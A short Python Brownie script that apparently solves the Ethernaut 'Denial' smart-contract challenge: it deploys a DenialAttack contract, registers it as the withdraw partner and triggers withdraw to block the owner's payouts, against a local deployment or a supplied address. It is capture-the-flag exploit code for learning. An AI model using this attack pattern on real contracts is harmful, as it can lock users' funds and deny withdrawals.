#!/usr/bin/python3
from brownie import Denial, DenialAttack, web3
from colorama import Fore
from scripts.deploy import deploy
from scripts.helpful_scripts import convert, get_account

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def attack(contract_address=None, attacker=None):
    if not contract_address:
        denial, _ = deploy()
        contract_address = denial.address
        _, attacker = get_account()
    else:
        denial = Denial.at(contract_address)

    attack_contract = DenialAttack.deploy({"from": attacker})
    contract_balance = web3.fromWei(denial.contractBalance({"from": attacker}), "ether")

    print(f"{green}Denial Contract balance: {red}{contract_balance}{green}")

    denial.setWithdrawPartner(attack_contract.address, {"from": attacker})
    denial.withdraw({"from": attacker})


def main(contract_address=None, attacker=None):
    if contract_address:
        attack(contract_address, get_account())
    else:
        attack()


if __name__ == "__main__":
    main()
